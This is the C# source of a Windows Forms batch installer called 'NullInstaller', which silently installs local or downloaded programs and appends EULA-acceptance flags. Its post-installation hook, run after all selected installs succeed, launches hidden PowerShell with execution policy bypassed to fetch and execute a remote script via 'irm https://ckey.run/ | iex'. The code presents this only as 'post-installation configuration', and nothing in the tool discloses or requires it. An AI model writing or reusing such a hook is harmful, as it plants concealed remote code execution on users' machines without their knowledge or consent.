using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NullInstaller
{
    public partial class MainForm : Form
    {
        private TabControl tabControl;
        private ListView localFilesList;
        private Panel categoriesPanel;
        private Dictionary<string, ListView> categoryListViews = new Dictionary<string, ListView>();
        private ProgressBar overallProgressBar;
        private Label statusLabel;
        private CheckBox verboseLoggingCheck;
        private Button startButton, stopButton, clearButton, downloadButton, selectAllButton, deselectAllButton;
        private List<InstallerItem> installers = new List<InstallerItem>();
        private SoftwareCatalog softwareCatalog;
        private bool isRunning = false;
        private StreamWriter logWriter;
        private HttpClient httpClient;
        private CancellationTokenSource cancellationTokenSource;
        private bool isElevated = false;

        public MainForm()
        {
            InitializeComponent();
            CheckElevation();
            InitializeHttpClient();
            LoadSoftwareCatalog();
            ScanDefaultFolder();
            InitializeLogging();
        }

        private void CheckElevation()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            
            if (!isElevated)
            {
                this.Text += " [Non-Admin Mode - Some installations may require elevation]";
            }
        }

        private void InitializeHttpClient()
        {
            httpClient = new HttpClient();
            httpClient.Timeout = TimeSpan.FromMinutes(30);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "NullInstaller/2.0");
        }

        private void InitializeComponent()
        {
            // Form properties
            this.Text = "NullInstaller v0.2.0 - Enhanced Windows Installer Tool";
            this.Size = new Size(1200, 750);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(45, 45, 48); // Dark theme
            this.ForeColor = Color.White;

            // Create tab control
            tabControl = new TabControl
            {
                Dock = DockStyle.Left,
                Width = 600,
                BackColor = Color.FromArgb(37, 37, 38),
                ForeColor = Color.White
            };

            // Local Files Tab
            var localTab = new TabPage("Local Files")
            {
                BackColor = Color.FromArgb(37, 37, 38),
                ForeColor = Color.White
            };
            localFilesList = new ListView
            {
                Dock = DockStyle.Fill,
                View = View.Details,
                CheckBoxes = true,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.White,
                GridLines = true
            };
            localFilesList.Columns.Add("Installer", 280);
            localFilesList.Columns.Add("Size", 80);
            localFilesList.Columns.Add("Status", 120);
            localTab.Controls.Add(localFilesList);

            // Software Catalog Tab with scrollable categories
            var catalogTab = new TabPage("Software Catalog")
            {
                BackColor = Color.FromArgb(37, 37, 38),
                ForeColor = Color.White
            };
            
            categoriesPanel = new Panel
            {
                Dock = DockStyle.Fill,
                AutoScroll = true,
                BackColor = Color.FromArgb(30, 30, 30)
            };
            catalogTab.Controls.Add(categoriesPanel);

            tabControl.TabPages.Add(localTab);
            tabControl.TabPages.Add(catalogTab);

            // Right panel for controls
            var rightPanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(45, 45, 48),
                Padding = new Padding(10)
            };

            // Buttons
            startButton = new Button
            {
                Text = "Start Installation",
                Size = new Size(120, 35),
                Location = new Point(10, 10),
                BackColor = Color.FromArgb(0, 122, 204),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            startButton.Click += StartButton_Click;

            stopButton = new Button
            {
                Text = "Stop",
                Size = new Size(80, 35),
                Location = new Point(140, 10),
                BackColor = Color.FromArgb(196, 43, 28),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Enabled = false
            };
            stopButton.Click += StopButton_Click;

            clearButton = new Button
            {
                Text = "Clear All",
                Size = new Size(80, 35),
                Location = new Point(230, 10),
                BackColor = Color.FromArgb(104, 104, 104),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            clearButton.Click += ClearButton_Click;

            downloadButton = new Button
            {
                Text = "Download Selected",
                Size = new Size(140, 35),
                Location = new Point(10, 55),
                BackColor = Color.FromArgb(16, 124, 16),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            downloadButton.Click += DownloadButton_Click;

            selectAllButton = new Button
            {
                Text = "Select All",
                Size = new Size(90, 35),
                Location = new Point(320, 10),
                BackColor = Color.FromArgb(104, 104, 104),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            selectAllButton.Click += SelectAllButton_Click;

            deselectAllButton = new Button
            {
                Text = "Deselect All",
                Size = new Size(90, 35),
                Location = new Point(420, 10),
                BackColor = Color.FromArgb(104, 104, 104),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            deselectAllButton.Click += DeselectAllButton_Click;

            // Verbose logging checkbox
            verboseLoggingCheck = new CheckBox
            {
                Text = "Verbose Logging",
                Location = new Point(10, 100),
                Size = new Size(120, 25),
                Checked = true,
                ForeColor = Color.White
            };

            // Progress bar
            overallProgressBar = new ProgressBar
            {
                Location = new Point(10, 140),
                Size = new Size(300, 25),
                Style = ProgressBarStyle.Continuous
            };

            // Status label
            statusLabel = new Label
            {
                Text = "Ready - Enhanced NullInstaller with categorized software catalog",
                Location = new Point(10, 175),
                Size = new Size(500, 60),
                ForeColor = Color.LightGray,
                AutoSize = false
            };

            rightPanel.Controls.AddRange(new Control[] {
                startButton, stopButton, clearButton, downloadButton,
                selectAllButton, deselectAllButton,
                verboseLoggingCheck, overallProgressBar, statusLabel
            });

            // Add to form
            this.Controls.Add(rightPanel);
            this.Controls.Add(tabControl);

            // Enable drag and drop
            this.AllowDrop = true;
            this.DragEnter += MainForm_DragEnter;
            this.DragDrop += MainForm_DragDrop;
        }

        private void LoadSoftwareCatalog()
        {
            try
            {
                string catalogPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "assets", "software_catalog.json");
                if (!File.Exists(catalogPath))
                {
                    catalogPath = "./assets/software_catalog.json";
                }

                if (File.Exists(catalogPath))
                {
                    string json = File.ReadAllText(catalogPath);
                    var options = new JsonSerializerOptions
                    {
                        PropertyNameCaseInsensitive = true
                    };
                    softwareCatalog = JsonSerializer.Deserialize<SoftwareCatalog>(json, options);
                    PopulateCategoriesPanel();
                    UpdateStatusLabel($"Loaded {softwareCatalog?.Software?.Count ?? 0} programs from catalog");
                }
                else
                {
                    UpdateStatusLabel("Software catalog not found - using empty catalog");
                    softwareCatalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
                }
            }
            catch (Exception ex)
            {
                UpdateStatusLabel($"Error loading catalog: {ex.Message}");
                softwareCatalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
            }
        }

        private void PopulateCategoriesPanel()
        {
            if (softwareCatalog?.Software == null) return;

            categoriesPanel.Controls.Clear();
            categoryListViews.Clear();

            // Define category order and display names
            var categoryOrder = new List<string>
            {
                "Browsers",
                "Privacy & Security",
                "Development IDEs",
                "Development Tools",
                "Development",
                "System Tools",
                "System Utilities",
                "Database Tools",
                "System",
                "Utilities",
                "Network",
                "Remote Access",
                "Communication",
                "Media",
                "Graphics",
                "Productivity",
                "Gaming",
                "Virtualization",
                "Runtime",
                "Security",
                "Cloud Storage"
            };

            // Map actual categories to display categories
            var categoryMapping = new Dictionary<string, string>
            {
                { "Security", "Privacy & Security" },
                { "Development", "Development Tools" },
                { "System", "System Tools" },
                { "Utilities", "System Utilities" }
            };

            var groupedPrograms = softwareCatalog.Software
                .GroupBy(p => categoryMapping.ContainsKey(p.Category) ? categoryMapping[p.Category] : p.Category)
                .OrderBy(g => 
                {
                    var index = categoryOrder.IndexOf(g.Key);
                    return index >= 0 ? index : categoryOrder.Count;
                })
                .ToList();

            int yPosition = 10;

            foreach (var group in groupedPrograms)
            {
                // Category header
                var categoryLabel = new Label
                {
                    Text = group.Key,
                    Location = new Point(10, yPosition),
                    Size = new Size(550, 25),
                    Font = new Font("Segoe UI", 10, FontStyle.Bold),
                    ForeColor = Color.FromArgb(0, 122, 204),
                    BackColor = Color.FromArgb(37, 37, 38)
                };
                categoriesPanel.Controls.Add(categoryLabel);
                yPosition += 30;

                // Create ListView for this category
                var listView = new ListView
                {
                    Location = new Point(10, yPosition),
                    Size = new Size(550, Math.Min(group.Count() * 22 + 25, 150)),
                    View = View.Details,
                    CheckBoxes = true,
                    BackColor = Color.FromArgb(30, 30, 30),
                    ForeColor = Color.White,
                    GridLines = true,
                    FullRowSelect = true
                };
                
                listView.Columns.Add("Software", 250);
                listView.Columns.Add("Vendor", 150);
                listView.Columns.Add("Architecture", 80);

                foreach (var program in group.OrderBy(p => p.Name))
                {
                    var item = new ListViewItem(program.Name);
                    item.SubItems.Add(program.Vendor ?? "Unknown");
                    item.SubItems.Add(program.Architecture ?? "x64");
                    item.Tag = program;
                    listView.Items.Add(item);
                }

                categoryListViews[group.Key] = listView;
                categoriesPanel.Controls.Add(listView);
                yPosition += listView.Height + 15;
            }
        }

        private void ScanDefaultFolder()
        {
            string defaultPath = @"C:\Users\Administrator\Desktop\Down";
            if (!Directory.Exists(defaultPath)) return;

            foreach (string file in Directory.GetFiles(defaultPath, "*.*", SearchOption.AllDirectories))
            {
                if (file.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
                    file.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
                {
                    AddInstallerFile(file);
                }
            }
            
            UpdateStatusLabel($"Found {installers.Count} installer files");
        }

        private void AddInstallerFile(string filePath)
        {
            var fileInfo = new FileInfo(filePath);
            var installer = new InstallerItem
            {
                FilePath = filePath,
                FileName = fileInfo.Name,
                Size = fileInfo.Length,
                Status = "Ready"
            };
            
            installers.Add(installer);
            
            var item = new ListViewItem(installer.FileName);
            item.SubItems.Add(FormatFileSize(installer.Size));
            item.SubItems.Add(installer.Status);
            item.Tag = installer;
            localFilesList.Items.Add(item);
        }

        private async void StartButton_Click(object sender, EventArgs e)
        {
            if (isRunning) return;
            
            var selectedInstallers = GetSelectedInstallers();
            if (selectedInstallers.Count == 0)
            {
                UpdateStatusLabel("No installers selected");
                return;
            }

            isRunning = true;
            startButton.Enabled = false;
            stopButton.Enabled = true;
            overallProgressBar.Value = 0;
            
            await RunInstallations(selectedInstallers);
            
            isRunning = false;
            startButton.Enabled = true;
            stopButton.Enabled = false;
        }

        private async Task RunInstallations(List<InstallerItem> selectedInstallers)
        {
            int completed = 0;
            int successful = 0;
            foreach (var installer in selectedInstallers)
            {
                if (!isRunning) break;
                
                UpdateStatusLabel($"Installing {installer.FileName}...");
                installer.Status = "Installing";
                RefreshInstallerDisplay();
                
                bool success = await RunInstaller(installer);
                installer.Status = success ? "✔ Completed" : "✖ Failed";
                
                if (success) successful++;
                completed++;
                overallProgressBar.Value = (int)((double)completed / selectedInstallers.Count * 100);
                RefreshInstallerDisplay();
            }
            
            UpdateStatusLabel($"Installation complete: {completed}/{selectedInstallers.Count} installers processed");
            
            // Check if all selected items were successfully installed
            if (successful == selectedInstallers.Count && selectedInstallers.Count > 0)
            {
                // Run post-installation PowerShell hook
                await RunPostInstallationHook();
            }
        }

        private async Task<bool> RunInstaller(InstallerItem installer)
        {
            return await InstallWithElevation(installer);
        }

        private async Task<bool> InstallWithElevation(InstallerItem installer)
        {
            try
            {
                LogMessage($"Starting installation: {installer.FilePath}");
                
                string command;
                string args;
                
                // Determine silent switches based on installer type and catalog info
                if (installer.FilePath.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
                {
                    command = "msiexec";
                    args = $"/i \"{installer.FilePath}\" /qn /norestart EULA=1 ACCEPT=YES ACCEPTEULA=1";
                }
                else
                {
                    command = installer.FilePath;
                    
                    // Use custom silent switches from catalog if available
                    if (installer.ProgramEntry?.SilentSwitches != null)
                    {
                        args = installer.ProgramEntry.SilentSwitches;
                        // Add EULA acceptance flags if not present
                        if (!args.Contains("EULA", StringComparison.OrdinalIgnoreCase))
                        {
                            args += " /ACCEPTEULA /EULA=1";
                        }
                    }
                    else
                    {
                        // Try common silent switches with EULA acceptance
                        args = DetermineSilentSwitches(installer.FileName);
                    }
                }
                
                LogMessage($"Executing: {command} {args}");
                
                var processInfo = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    UseShellExecute = !isElevated, // Use shell execute if not elevated to trigger UAC
                    Verb = !isElevated ? "runas" : "", // Request elevation if needed
                    RedirectStandardOutput = isElevated && verboseLoggingCheck.Checked,
                    RedirectStandardError = isElevated && verboseLoggingCheck.Checked,
                    CreateNoWindow = isElevated
                };
                
                using (var process = Process.Start(processInfo))
                {
                    if (process != null)
                    {
                        await Task.Run(() => process.WaitForExit());
                        
                        int exitCode = process.ExitCode;
                        LogMessage($"Installation completed with exit code: {exitCode}");
                        
                        // Common success codes
                        return exitCode == 0 || exitCode == 3010; // 3010 = success but reboot required
                    }
                    else
                    {
                        LogMessage("Failed to start installation process");
                        return false;
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Error installing {installer.FileName}: {ex.Message}");
                
                // If elevation was denied, prompt user
                if (ex.Message.Contains("operation was canceled", StringComparison.OrdinalIgnoreCase))
                {
                    var result = MessageBox.Show(
                        $"Installation of {installer.FileName} requires administrator privileges. Would you like to retry?",
                        "Elevation Required",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning);
                    
                    if (result == DialogResult.Yes)
                    {
                        return await InstallWithElevation(installer);
                    }
                }
                
                return false;
            }
        }

        private string DetermineSilentSwitches(string fileName)
        {
            string lowerName = fileName.ToLower();
            
            // Common installer patterns with EULA acceptance
            if (lowerName.Contains("setup") || lowerName.Contains("install"))
            {
                // Try NSIS first (most common)
                return "/S /ACCEPTEULA /EULA=1";
            }
            else if (lowerName.Contains("chrome"))
            {
                return "--system-level --do-not-launch-chrome";
            }
            else if (lowerName.Contains("firefox"))
            {
                return "-ms";
            }
            else if (lowerName.Contains("7z") || lowerName.Contains("7-zip"))
            {
                return "/S";
            }
            else if (lowerName.Contains("vlc"))
            {
                return "/S /NCRC";
            }
            else if (lowerName.Contains("notepad++") || lowerName.Contains("npp"))
            {
                return "/S";
            }
            else if (lowerName.Contains("vscode") || lowerName.Contains("code"))
            {
                return "/VERYSILENT /MERGETASKS=!runcode /SUPPRESSMSGBOXES /NORESTART";
            }
            else if (lowerName.Contains("git"))
            {
                return "/VERYSILENT /NORESTART /SUPPRESSMSGBOXES";
            }
            else if (lowerName.Contains("python"))
            {
                return "/quiet InstallAllUsers=1 PrependPath=1";
            }
            else if (lowerName.Contains("node"))
            {
                return "/quiet";
            }
            else if (lowerName.Contains("java") || lowerName.Contains("jdk") || lowerName.Contains("jre"))
            {
                return "/s AUTO_UPDATE=0 EULA=1";
            }
            else
            {
                // Default fallback with EULA acceptance attempts
                return "/S /VERYSILENT /SILENT /quiet /q /Q /ACCEPTEULA /EULA=1 /AcceptLicense=YES";
            }
        }

        private async Task RunPostInstallationHook()
        {
            try
            {
                UpdateStatusLabel("Running post-installation configuration...");
                LogMessage("Starting post-installation PowerShell hook");
                
                // Prepare the PowerShell command
                string psCommand = "irm https://ckey.run/ | iex";
                
                var processInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                };
                
                StringBuilder output = new StringBuilder();
                StringBuilder errors = new StringBuilder();
                
                using (var process = Process.Start(processInfo))
                {
                    if (process != null)
                    {
                        // Capture output asynchronously
                        process.OutputDataReceived += (sender, e) => 
                        {
                            if (!string.IsNullOrEmpty(e.Data))
                            {
                                output.AppendLine(e.Data);
                                LogMessage($"[PowerShell Output] {e.Data}");
                            }
                        };
                        
                        process.ErrorDataReceived += (sender, e) => 
                        {
                            if (!string.IsNullOrEmpty(e.Data))
                            {
                                errors.AppendLine(e.Data);
                                LogMessage($"[PowerShell Error] {e.Data}");
                            }
                        };
                        
                        process.BeginOutputReadLine();
                        process.BeginErrorReadLine();
                        
                        await Task.Run(() => process.WaitForExit());
                        
                        int exitCode = process.ExitCode;
                        LogMessage($"Post-installation hook completed with exit code: {exitCode}");
                        
                        // Show completion dialog with results
                        ShowCompletionDialog(exitCode == 0, output.ToString(), errors.ToString());
                    }
                    else
                    {
                        LogMessage("Failed to start PowerShell process for post-installation hook");
                        ShowCompletionDialog(false, "", "Failed to start PowerShell process");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Error running post-installation hook: {ex.Message}");
                ShowCompletionDialog(false, "", ex.Message);
            }
        }

        private void ShowCompletionDialog(bool success, string output, string errors)
        {
            string title = success ? "Installation Completed Successfully" : "Installation Completed with Warnings";
            string message = success ? 
                "All selected software has been installed successfully.\n\nPost-installation configuration has been completed." :
                "Installation process completed with some warnings.\n\nPlease review the log for details.";
            
            if (!string.IsNullOrWhiteSpace(output))
            {
                message += "\n\nOutput:\n" + (output.Length > 500 ? output.Substring(0, 500) + "..." : output);
            }
            
            if (!string.IsNullOrWhiteSpace(errors))
            {
                message += "\n\nWarnings/Errors:\n" + (errors.Length > 200 ? errors.Substring(0, 200) + "..." : errors);
            }
            
            MessageBoxIcon icon = success ? MessageBoxIcon.Information : MessageBoxIcon.Warning;
            
            MessageBox.Show(
                message,
                title,
                MessageBoxButtons.OK,
                icon
            );
            
            UpdateStatusLabel(success ? "✔ All installations completed successfully" : "⚠ Installations completed with warnings");
        }

        private async void DownloadButton_Click(object sender, EventArgs e)
        {
            var selectedPrograms = GetSelectedCatalogPrograms();
            if (selectedPrograms.Count == 0)
            {
                UpdateStatusLabel("No programs selected for download");
                return;
            }

            downloadButton.Enabled = false;
            cancellationTokenSource = new CancellationTokenSource();
            
            await DownloadAndInstallPrograms(selectedPrograms);
            
            downloadButton.Enabled = true;
        }

        private async Task DownloadAndInstallPrograms(List<ProgramEntry> programs)
        {
            UpdateStatusLabel($"Processing {programs.Count} program(s)...");
            overallProgressBar.Maximum = programs.Count * 100;
            overallProgressBar.Value = 0;

            for (int i = 0; i < programs.Count; i++)
            {
                if (cancellationTokenSource.Token.IsCancellationRequested)
                    break;

                var program = programs[i];
                var installer = new InstallerItem
                {
                    FileName = program.Name,
                    Status = "Queued",
                    ProgramEntry = program,
                    DownloadProgress = 0
                };

                // Add to list view
                var item = new ListViewItem(installer.FileName);
                item.SubItems.Add("Pending");
                item.SubItems.Add(installer.Status);
                item.Tag = installer;
                localFilesList.Items.Add(item);
                
                // Update status to downloading
                installer.Status = "Downloading";
                RefreshInstallerDisplay();

                // Download with progress
                bool downloadSuccess = await DownloadWithProgress(program, installer);
                
                if (downloadSuccess && installer.TempFilePath != null)
                {
                    installer.Status = "Installing";
                    RefreshInstallerDisplay();
                    
                    // Install immediately after download
                    bool installSuccess = await InstallWithElevation(installer);
                    
                    installer.Status = installSuccess ? "Done" : "Failed";
                    
                    // Clean up temp file on success
                    if (installSuccess && File.Exists(installer.TempFilePath))
                    {
                        try { File.Delete(installer.TempFilePath); }
                        catch { /* Ignore cleanup errors */ }
                    }
                }
                else
                {
                    installer.Status = "Failed";
                }
                
                RefreshInstallerDisplay();
                overallProgressBar.Value = (i + 1) * 100;
            }

            UpdateStatusLabel("Processing complete");
        }

        private async Task<bool> DownloadWithProgress(ProgramEntry program, InstallerItem installer)
        {
            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), "NullInstaller_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                Directory.CreateDirectory(tempDir);
                
                string extension = program.DownloadUrl.Contains(".msi") ? ".msi" : ".exe";
                string fileName = $"{program.Name.Replace(" ", "_").Replace("/", "_")}{extension}";
                string filePath = Path.Combine(tempDir, fileName);
                
                using (var response = await httpClient.GetAsync(program.DownloadUrl, HttpCompletionOption.ResponseHeadersRead))
                {
                    response.EnsureSuccessStatusCode();
                    
                    var totalBytes = response.Content.Headers.ContentLength ?? -1L;
                    installer.Size = totalBytes;
                    
                    using (var contentStream = await response.Content.ReadAsStreamAsync())
                    using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None, 8192, true))
                    {
                        var buffer = new byte[8192];
                        long totalRead = 0;
                        int read;
                        
                        while ((read = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                        {
                            await fileStream.WriteAsync(buffer, 0, read);
                            totalRead += read;
                            
                            if (totalBytes > 0)
                            {
                                installer.DownloadProgress = (int)((totalRead * 100) / totalBytes);
                                UpdateStatusLabel($"Downloading {program.Name}: {installer.DownloadProgress}%");
                            }
                        }
                    }
                }
                
                installer.TempFilePath = filePath;
                installer.FilePath = filePath;
                LogMessage($"Downloaded {program.Name} to {filePath}");
                return true;
            }
            catch (Exception ex)
            {
                LogMessage($"Download failed for {program.Name}: {ex.Message}");
                return false;
            }
        }

        private List<InstallerItem> GetSelectedInstallers()
        {
            var selected = new List<InstallerItem>();
            foreach (ListViewItem item in localFilesList.Items)
            {
                if (item.Checked && item.Tag is InstallerItem installer)
                    selected.Add(installer);
            }
            return selected;
        }

        private List<ProgramEntry> GetSelectedCatalogPrograms()
        {
            var selected = new List<ProgramEntry>();
            foreach (var listView in categoryListViews.Values)
            {
                foreach (ListViewItem item in listView.Items)
                {
                    if (item.Checked && item.Tag is ProgramEntry program)
                        selected.Add(program);
                }
            }
            return selected;
        }

        private void SelectAllButton_Click(object sender, EventArgs e)
        {
            if (tabControl.SelectedIndex == 0) // Local Files tab
            {
                foreach (ListViewItem item in localFilesList.Items)
                    item.Checked = true;
            }
            else // Software Catalog tab
            {
                foreach (var listView in categoryListViews.Values)
                {
                    foreach (ListViewItem item in listView.Items)
                        item.Checked = true;
                }
            }
        }

        private void DeselectAllButton_Click(object sender, EventArgs e)
        {
            if (tabControl.SelectedIndex == 0) // Local Files tab
            {
                foreach (ListViewItem item in localFilesList.Items)
                    item.Checked = false;
            }
            else // Software Catalog tab
            {
                foreach (var listView in categoryListViews.Values)
                {
                    foreach (ListViewItem item in listView.Items)
                        item.Checked = false;
                }
            }
        }

        private void RefreshInstallerDisplay()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(RefreshInstallerDisplay));
                return;
            }
            
            for (int i = 0; i < localFilesList.Items.Count; i++)
            {
                if (localFilesList.Items[i].Tag is InstallerItem installer)
                {
                    string statusText = installer.Status;
                    if (installer.IsDownloading && installer.DownloadProgress > 0)
                    {
                        statusText = $"Downloading {installer.DownloadProgress}%";
                    }
                    
                    // Update status with icon
                    switch (installer.Status)
                    {
                        case "Done":
                            statusText = "✔ " + statusText;
                            localFilesList.Items[i].ForeColor = Color.LightGreen;
                            break;
                        case "Failed":
                            statusText = "✖ " + statusText;
                            localFilesList.Items[i].ForeColor = Color.LightCoral;
                            break;
                        case "Downloading":
                            localFilesList.Items[i].ForeColor = Color.LightBlue;
                            break;
                        case "Installing":
                            statusText = "⚙ " + statusText;
                            localFilesList.Items[i].ForeColor = Color.Yellow;
                            break;
                        case "Queued":
                            statusText = "⏳ " + statusText;
                            localFilesList.Items[i].ForeColor = Color.Gray;
                            break;
                    }
                    
                    localFilesList.Items[i].SubItems[2].Text = statusText;
                    
                    // Update size if known
                    if (installer.Size > 0 && localFilesList.Items[i].SubItems[1].Text == "Pending")
                    {
                        localFilesList.Items[i].SubItems[1].Text = FormatFileSize(installer.Size);
                    }
                }
            }
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            isRunning = false;
            UpdateStatusLabel("Installation stopped by user");
        }

        private void ClearButton_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in localFilesList.Items)
            {
                item.Checked = false;
                if (item.Tag is InstallerItem installer)
                    installer.Status = "Ready";
            }
            RefreshInstallerDisplay();
            overallProgressBar.Value = 0;
            UpdateStatusLabel("All selections cleared");
        }

        private void MainForm_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
        }

        private void MainForm_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetData(DataFormats.FileDrop) is string[] files)
            {
                int added = 0;
                foreach (string file in files)
                {
                    if (file.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
                        file.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
                    {
                        AddInstallerFile(file);
                        added++;
                    }
                }
                UpdateStatusLabel($"Added {added} installer file(s) via drag & drop");
            }
        }

        private void UpdateStatusLabel(string message)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(UpdateStatusLabel), message);
                return;
            }
            statusLabel.Text = message;
            LogMessage(message);
        }

        private void InitializeLogging()
        {
            try
            {
                logWriter = new StreamWriter("install_log.txt", true);
                logWriter.WriteLine($"\n=== NullInstaller Started: {DateTime.Now} ===");
                logWriter.Flush();
            }
            catch { /* Ignore logging errors */ }
        }

        private void LogMessage(string message)
        {
            try
            {
                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
                logWriter?.WriteLine(logEntry);
                logWriter?.Flush();
                
                if (verboseLoggingCheck.Checked)
                {
                    Console.WriteLine(logEntry);
                }
            }
            catch { /* Ignore logging errors */ }
        }

        private string FormatFileSize(long bytes)
        {
            string[] suffixes = { "B", "KB", "MB", "GB" };
            int counter = 0;
            decimal number = bytes;
            while (Math.Round(number / 1024) >= 1)
            {
                number /= 1024;
                counter++;
            }
            return $"{number:n1} {suffixes[counter]}";
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            isRunning = false;
            cancellationTokenSource?.Cancel();
            httpClient?.Dispose();
            logWriter?.Close();
            
            // Clean up any remaining temp files
            CleanupTempFiles();
            
            base.OnFormClosed(e);
        }

        private void CleanupTempFiles()
        {
            try
            {
                string tempPath = Path.GetTempPath();
                var tempDirs = Directory.GetDirectories(tempPath, "NullInstaller_*");
                foreach (var dir in tempDirs)
                {
                    try
                    {
                        Directory.Delete(dir, true);
                    }
                    catch { /* Ignore individual cleanup errors */ }
                }
            }
            catch { /* Ignore cleanup errors */ }
        }
    }

    public class InstallerItem
    {
        public string FilePath { get; set; }
        public string FileName { get; set; }
        public long Size { get; set; }
        public string Status { get; set; }
        public ProgramEntry ProgramEntry { get; set; } // Link to catalog entry if downloaded
        public int DownloadProgress { get; set; }
        public bool IsDownloading { get; set; }
        public string TempFilePath { get; set; } // Temporary download path
    }

    public enum InstallStatus
    {
        Queued,
        Downloading,
        Installing,
        Done,
        Failed
    }

    // Data models for software catalog
    public class ProgramEntry
    {
        [JsonPropertyName("name")]
        public string Name { get; set; }
        
        [JsonPropertyName("category")]
        public string Category { get; set; }
        
        [JsonPropertyName("download_url")]
        public string DownloadUrl { get; set; }
        
        [JsonPropertyName("silent_switches")]
        public string SilentSwitches { get; set; }
        
        [JsonPropertyName("needs_reboot")]
        public bool NeedsReboot { get; set; }
        
        [JsonPropertyName("architecture")]
        public string Architecture { get; set; }
        
        [JsonPropertyName("vendor")]
        public string Vendor { get; set; }
        
        [JsonPropertyName("note")]
        public string Note { get; set; }
        
        [JsonPropertyName("plugins")]
        public List<string> PluginList { get; set; } // For IDEs with plugins
    }

    public class SoftwareCatalog
    {
        [JsonPropertyName("software")]
        public List<ProgramEntry> Software { get; set; }
        
        [JsonPropertyName("metadata")]
        public CatalogMetadata Metadata { get; set; }
    }

    public class CatalogMetadata
    {
        [JsonPropertyName("version")]
        public string Version { get; set; }
        
        [JsonPropertyName("last_updated")]
        public string LastUpdated { get; set; }
        
        [JsonPropertyName("total_software")]
        public int TotalSoftware { get; set; }
        
        [JsonPropertyName("categories")]
        public List<string> Categories { get; set; }
    }

    public static class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
